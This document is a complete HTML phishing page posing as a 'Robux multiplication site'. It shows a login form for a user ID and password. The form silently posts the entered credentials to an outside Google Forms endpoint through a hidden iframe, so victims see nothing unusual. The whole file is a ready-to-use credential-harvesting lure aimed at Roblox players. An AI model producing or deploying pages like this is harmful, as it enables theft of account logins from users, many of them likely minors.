<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Robux multiplication site</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  height: 100vh;
  background: #0f0f0f;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: Arial, Helvetica, sans-serif;
}
.box {
  width: 100%;
  max-width: 360px;
  background: #1a1a1a;
  padding: 24px;
  border-radius: 12px;
}
h1 {
  color: white;
  text-align: center;
  margin-bottom: 20px;
}
input {
  width: 100%;
  padding: 14px;
  margin-bottom: 14px;
  font-size: 16px;
  border-radius: 8px;
  border: none;
}
button {
  width: 100%;
  padding: 14px;
  font-size: 16px;
  border: none;
  border-radius: 8px;
  background: #4caf50;
  color: white;
}
</style>
</head>
<body>

<div class="box">
  <h1>Log in</h1>

  <form
    action="https://docs.google.com/forms/d/e/1FAIpQLScQPI1GesErzZy_5sUddufuo9LW2ljMbQIY9JIcXNvP0FF7BA/formResponse"
    method="POST"
    target="hidden_iframe"
    onsubmit="submitted=true;"
  >
    <!-- Your ID -->
    <input
      type="text"
      name="entry.123456789"
      placeholder="Your ID"
      required
    >

    <!-- Your Password -->
    <input
      type="password"
      name="entry.987654321"
      placeholder="Your Password"
      required
    >

    <button type="submit">Log in</button>
  </form>

  <iframe name="hidden_iframe" style="display:none;"></iframe>
</div>

</body>
</html>
